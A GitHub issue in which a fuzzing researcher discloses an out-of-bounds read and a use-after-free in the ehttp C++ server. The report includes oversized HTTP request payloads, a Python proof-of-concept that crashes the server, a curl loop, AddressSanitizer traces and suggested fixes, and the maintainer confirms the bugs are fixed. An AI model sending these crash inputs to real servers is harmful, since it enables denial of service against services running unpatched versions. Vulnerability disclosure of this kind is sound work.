=== Content from github.com_e9b32567_20250111_125148.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fhongliuliao%2Fehttp%2Fissues%2F38)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fhongliuliao%2Fehttp%2Fissues%2F38)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=hongliuliao%2Fehttp)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[hongliuliao](/hongliuliao)
/
**[ehttp](/hongliuliao/ehttp)**
Public

* [Notifications](/login?return_to=%2Fhongliuliao%2Fehttp) You must be signed in to change notification settings
* [Fork
  110](/login?return_to=%2Fhongliuliao%2Fehttp)
* [Star
   317](/login?return_to=%2Fhongliuliao%2Fehttp)

* [Code](/hongliuliao/ehttp)
* [Issues
  0](/hongliuliao/ehttp/issues)
* [Pull requests
  0](/hongliuliao/ehttp/pulls)
* [Actions](/hongliuliao/ehttp/actions)
* [Projects
  0](/hongliuliao/ehttp/projects)
* [Wiki](/hongliuliao/ehttp/wiki)
* [Security](/hongliuliao/ehttp/security)
* [Insights](/hongliuliao/ehttp/pulse)

Additional navigation options

* [Code](/hongliuliao/ehttp)
* [Issues](/hongliuliao/ehttp/issues)
* [Pull requests](/hongliuliao/ehttp/pulls)
* [Actions](/hongliuliao/ehttp/actions)
* [Projects](/hongliuliao/ehttp/projects)
* [Wiki](/hongliuliao/ehttp/wiki)
* [Security](/hongliuliao/ehttp/security)
* [Insights](/hongliuliao/ehttp/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fhongliuliao%2Fehttp%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fhongliuliao%2Fehttp%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Memory Corruption Bugs #38

Closed

[Halcy0nic](/Halcy0nic) opened this issue
Oct 8, 2023
· 2 comments

Closed

# [Memory Corruption Bugs](#top) #38

[Halcy0nic](/Halcy0nic) opened this issue
Oct 8, 2023
· 2 comments

## Comments

[![@Halcy0nic](https://avatars.githubusercontent.com/u/42481692?s=80&u=2d33594f736ed622d96b4fa6f965ab39b433b7f1&v=4)](/Halcy0nic)

Copy link

### **[Halcy0nic](/Halcy0nic)** commented [Oct 8, 2023](#issue-1931587083)

| Hi!  When executing my fuzz tests I discovered a few bugs at the following locations:   * Out-of-bounds-read in void \_log at simple\_log.cpp:221 * Use-after-free in read\_func(void\*) at epoll\_socket.cpp:234  Out-of-bounds-read in void \_log at simple\_log.cpp:221 when sending a malformed HTTP method, large url, or large HTTP header value to the server    [ehttp/src/simple\_log.cpp](https://github.com/hongliuliao/ehttp/blob/716ff7a60a28a943855d8811eda44c611d58b349/src/simple_log.cpp#L219-L223)  Lines 219 to 223 in [716ff7a](/hongliuliao/ehttp/commit/716ff7a60a28a943855d8811eda44c611d58b349)   |  | void \_log(const char \*format, va\_list ap) { | | --- | --- | |  | if (!use\_file\_appender) { // if no config, send log to stdout | |  | vprintf(format, ap); | |  | printf("\n"); | |  | return; |      Below are a few examples:  *Malformed HTTP Method*  ``` GETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGETGET /  ```  *Malformed URL*  ``` GET /hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello/hello  ```  I compiled and executed the examples from the instructions with address sanitizer to help debug the exact location of the out-of-bounds-read: Makefile modifications ``` CXXFLAGS += -g -Wall -fsanitize=address LDFLAGS += -pthread -fsanitize=address  ``` Compilation ```  make && make test && ./output/test/hello_server 8080  ``` Below is a proof of concept script named 'poc.py' to reproduce the issue: ``` #!/usr/bin/env python3  import socket  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect(("localhost", 8080)) sock.send(b"GET"*5000+b" /hello"*5000+b" HTTP/1.1\r\nHost:localhost:8080\r\n\r\n") response = sock.recv(4096) sock.close()  ``` Executing the Python3 script ``` $ python3 poc.py  ``` Address Sanitizer Output ``` ==2308883==ERROR: AddressSanitizer: dynamic-stack-buffer-overflow on address 0x7fdc638f3ce0 at pc 0x7fdc6889109c bp 0x7fdc638f2040 sp 0x7fdc638f1800 READ of size 4097 at 0x7fdc638f3ce0 thread T3                                   #0 0x7fdc6889109b in printf_common ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors_format.inc:553                                                   #1 0x7fdc6889189a in __interceptor_vprintf ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1738                                                 #2 0x559614bebecd in _log(char const*, __va_list_tag*) src/simple_log.cpp:221                                                                                                   #3 0x559614bec870 in log_debug(char const*, ...) src/simple_log.cpp:290     #4 0x559614bdf2a1 in Request::parse_request(char const*, int) src/sim_parser.cpp:580     #5 0x559614bc75bc in HttpEpollWatcher::on_readable(int&, epoll_event&) src/http_server.cpp:296     #6 0x559614bf59c0 in EpollSocket::handle_readable_event(epoll_event&) src/epoll_socket.cpp:247     #7 0x559614bf5703 in read_func(void*) src/epoll_socket.cpp:230     #8 0x559614beddd9 in Task::run() src/threadpool.cpp:19                         #9 0x559614beefa7 in ThreadPool::execute_thread() src/threadpool.cpp:159     #10 0x559614bee10c in ss_start_thread src/threadpool.cpp:48                          #11 0x7fdc682a63eb in start_thread nptl/pthread_create.c:444                                                                                                                    #12 0x7fdc68326a1b in clone3 ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81                                                                                         Address 0x7fdc638f3ce0 is located in stack of thread T3                              SUMMARY: AddressSanitizer: dynamic-stack-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors_format.inc:553 in printf_common Shadow bytes around the buggy address:                                                    0x7fdc638f3a00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x7fdc638f3a80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x7fdc638f3b00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x7fdc638f3b80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x7fdc638f3c00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x7fdc638f3c80: 00 00 00 00 00 00 00 00 00 00 00 00[cb]cb cb cb   0x7fdc638f3d00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x7fdc638f3d80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x7fdc638f3e00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x7fdc638f3e80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x7fdc638f3f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes):   Addressable:           00   Partially addressable: 01 02 03 04 05 06 07    Heap left redzone:       fa   Freed heap region:       fd   Stack left redzone:      f1   Stack mid redzone:       f2   Stack right redzone:     f3   Stack after return:      f5   Stack use after scope:   f8   Global redzone:          f9   Global init order:       f6   Poisoned by user:        f7   Container overflow:      fc   Array cookie:            ac   Intra object redzone:    bb   ASan internal:           fe   Left alloca redzone:     ca   Right alloca redzone:    cb Thread T3 created by T1 here:     #0 0x7fdc68847c36 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:208     #1 0x559614bee436 in ThreadPool::start_threadpool() src/threadpool.cpp:70     #2 0x559614bf74ba in EpollSocket::init_tp() src/epoll_socket.cpp:417     #3 0x559614bf87b4 in EpollSocket::start_epoll() src/epoll_socket.cpp:514     #4 0x559614bc539e in HttpServer::start_sync() src/http_server.cpp:132     #5 0x559614bc5067 in http_start_routine(void*) src/http_server.cpp:102     #6 0x7fdc682a63eb in start_thread nptl/pthread_create.c:444  Thread T1 created by T0 here:     #0 0x7fdc68847c36 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:208     #1 0x559614bc50a1 in HttpServer::start_async() src/http_server.cpp:107     #2 0x559614bc0d99 in main test/hello_server.cpp:112     #3 0x7fdc682456c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58  ==2308883==ABORTING  ``` Potential Fix A potential fix for this would be to check the size of the format/arg passed to *int vprintf ( const char \* format, va\_list arg );*   ---  Heap use-after-free in read\_func(void\*) at epoll\_socket.cpp:234    [ehttp/src/epoll\_socket.cpp](https://github.com/hongliuliao/ehttp/blob/716ff7a60a28a943855d8811eda44c611d58b349/src/epoll_socket.cpp#L228-L237)  Lines 228 to 237 in [716ff7a](/hongliuliao/ehttp/commit/716ff7a60a28a943855d8811eda44c611d58b349)   |  | void read\_func(void \*data) { | | --- | --- | |  | TaskData \*td = (TaskData \*) data; | |  | td->es->handle\_readable\_event(td->event); | |  |  | |  | EpollContext \*hc = (EpollContext \*) td->event.data.ptr; | |  | if (hc != NULL) { | |  | hc->\_ctx\_status = CONTEXT\_READ\_OVER; | |  | } | |  | delete td; | |  | } |      Similar to above, I compiled and executed the examples from the instructions with address sanitizer to help debug the exact location of the use-after-free bug: Makefile modifications ``` CXXFLAGS += -g -Wall -fsanitize=address LDFLAGS += -pthread -fsanitize=address  ``` Compilation ```  make && make test && ./output/test/issue5_server 1234  ``` Sending multiple consecutive connections to the server results in a use-after-free bug **After running the script below, wait around ~30-60 seconds and the server will crash.**  ``` $ while true; do curl http://localhost:1234/; done   ```   use-after-free-fuzz.mp4    Address Sanitizer Output ```  ==131898==ERROR: AddressSanitizer: heap-use-after-free on address 0x607001a34440 at pc 0x55999cd1a37f bp 0x7f44178fddd0 sp 0x7f44178fddc8                                       WRITE of size 4 at 0x607001a34440 thread T2                                                                                                                                         #0 0x55999cd1a37e in read_func(void*) src/epoll_socket.cpp:234                          #1 0x55999cd25201 in Task::run() src/threadpool.cpp:19                    #2 0x55999cd263cf in ThreadPool::execute_thread() src/threadpool.cpp:159     #3 0x55999cd25534 in ss_start_thread src/threadpool.cpp:48                                                                                                                      #4 0x7f441b0a63eb in start_thread nptl/pthread_create.c:444                             #5 0x7f441b126a1b in clone3 ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81                                                                                                                                                                                           0x607001a34440 is located 64 bytes inside of 72-byte region [0x607001a34400,0x607001a34448)                                                                                     freed by thread T3 here:                                                                    #0 0x7f441b6da008 in operator delete(void*, unsigned long) ../../../../src/libsanitizer/asan/asan_new_delete.cpp:164                                                            #1 0x55999cd1dd7c in EpollSocket::close_and_release(epoll_event&) src/epoll_socket.cpp:571                                                                                      #2 0x55999cd1aa19 in EpollSocket::handle_writeable_event(int&, epoll_event&, EpollSocketWatcher&) src/epoll_socket.cpp:275                                                      #3 0x55999cd189d2 in write_func(void*) src/epoll_socket.cpp:74                                                                                                                  #4 0x55999cd25201 in Task::run() src/threadpool.cpp:19                                  #5 0x55999cd263cf in ThreadPool::execute_thread() src/threadpool.cpp:159                #6 0x55999cd25534 in ss_start_thread src/threadpool.cpp:48                                                                                                                      #7 0x7f441b0a63eb in start_thread nptl/pthread_create.c:444                                                                                                                 previously allocated by thread T0 here:                                                     #0 0x7f441b6d9108 in operator new(unsigned long) ../../../../src/libsanitizer/asan/asan_new_delete.cpp:95                                                                       #1 0x55999cd19c6b in EpollSocket::create_client(int, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&) src/epoll_socket.cpp:191           #2 0x55999cd19eed in EpollSocket::handle_accept_event(int&, epoll_event&, EpollSocketWatcher&) src/epoll_socket.cpp:209                                                         #3 0x55999cd1bc20 in EpollSocket::handle_event(epoll_event&) src/epoll_socket.cpp:386                                                                                           #4 0x55999cd1d0cc in EpollSocket::start_event_loop() src/epoll_socket.cpp:491                                                                                                   #5 0x55999cd1d5c7 in EpollSocket::start_epoll() src/epoll_socket.cpp:526                #6 0x55999ccef9fe in HttpServer::start_sync() src/http_server.cpp:132                   #7 0x55999cceb270 in main test/issue5/issue5_server.cpp:78                              #8 0x7f441b0456c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58                                                                                                                                                                               Thread T2 created by T0 here:                                                               #0 0x7f441b647c36 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:208                                                                   #1 0x55999cd2585e in ThreadPool::start_threadpool() src/threadpool.cpp:70               #2 0x55999cd1c080 in EpollSocket::init_tp() src/epoll_socket.cpp:417                    #3 0x55999cd1d37a in EpollSocket::start_epoll() src/epoll_socket.cpp:514     #4 0x55999ccef9fe in HttpServer::start_sync() src/http_server.cpp:132      #5 0x55999cceb270 in main test/issue5/issue5_server.cpp:78                                                                                                                      #6 0x7f441b0456c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58                                                                                                                                                                                                                                                                       SUMMARY: AddressSanitizer: heap-use-after-free src/epoll_socket.cpp:234 in read_func(void*)                                                                                     Shadow bytes around the buggy address:                                                    0x607001a34180: fd fd fd fd fd fa fa fa fa fa fd fd fd fd fd fd           0x607001a34200: fd fd fd fa fa fa fa fa fd fd fd fd fd fd fd fd              0x607001a34280: fd fa fa fa fa fa fd fd fd fd fd fd fd fd fd fa                                                                                                                 0x607001a34300: fa fa fa fa fd fd fd fd fd fd fd fd fd fa fa fa                         0x607001a34380: fa fa fd fd fd fd fd fd fd fd fd fa fa fa fa fa                       =>0x607001a34400: fd fd fd fd fd fd fd fd[fd]fa fa fa fa fa fd fd                                                                                                                 0x607001a34480: fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd                                                                                                                 0x607001a34500: fd fd fd fd fd fa fa fa fa fa fd fd fd fd fd fd                         0x607001a34580: fd fd fd fa fa fa fa fa fd fd fd fd fd fd fd fd                                                                                                                 0x607001a34600: fd fa fa fa fa fa fd fd fd fd fd fd fd fd fd fa                                                                                                                 0x607001a34680: fa fa fa fa fd fd fd fd fd fd fd fd fd fa fa fa                                                                                                               Shadow byte legend (one shadow byte represents 8 application bytes):                                                                                                              Addressable:           00                                                               Partially addressable: 01 02 03 04 05 06 07                                             Heap left redzone:       fa                                                                                                                                                     Freed heap region:       fd                                                             Stack left redzone:      f1                                                             Stack mid redzone:       f2                                                             Stack right redzone:     f3                                                                                                                                                     Stack after return:      f5                                                                                                                                                     Stack use after scope:   f8                                                                                                                                                     Global redzone:          f9                                                                                                                                                     Global init order:       f6                                                                                                                                                     Poisoned by user:        f7                                                             Container overflow:      fc                                                             Array cookie:            ac                                                             Intra object redzone:    bb                                                                                                                                                     ASan internal:           fe                                                             Left alloca redzone:     ca                                                             Right alloca redzone:    cb                                                                                                                                                   ==131898==ABORTING                                  ``` Potential Fix A potential fix for this bug would be to set the pointers to NULL once they are freed. I believe the pointer of interest is the following:   * EpollContext \*hc = (EpollContext \*)  ---  References  * <https://cwe.mitre.org/data/definitions/416.html> * <https://cwe.mitre.org/data/definitions/125.html> |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@hongliuliao](https://avatars.githubusercontent.com/u/1174006?s=80&u=636e7d781e2f5665aaa779d49bcce1a68ca19171&v=4)](/hongliuliao)

Copy link

Owner

### **[hongliuliao](/hongliuliao)** commented [Oct 8, 2023](#issuecomment-1751940831)

| Thanks for your report, I had fixed them. |
| --- |

All reactions

Sorry, something went wrong.

[![@Halcy0nic](https://avatars.githubusercontent.com/u/42481692?s=80&u=2d33594f736ed622d96b4fa6f965ab39b433b7f1&v=4)](/Halcy0nic)

Copy link

Author

### **[Halcy0nic](/Halcy0nic)** commented [Oct 8, 2023](#issuecomment-1752175518)

| Awesome, thanks for the quick update. |
| --- |

All reactions

Sorry, something went wrong.

[![@Halcy0nic](https://avatars.githubusercontent.com/u/42481692?s=40&u=2d33594f736ed622d96b4fa6f965ab39b433b7f1&v=4)](/Halcy0nic)
[Halcy0nic](/Halcy0nic)
closed this as [completed](/hongliuliao/ehttp/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Oct 8, 2023](#event-10585536519)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fhongliuliao%2Fehttp%2Fissues%2F38)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

2 participants

[![@hongliuliao](https://avatars.githubusercontent.com/u/1174006?s=52&v=4)](/hongliuliao) [![@Halcy0nic](https://avatars.githubusercontent.com/u/42481692?s=52&v=4)](/Halcy0nic)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
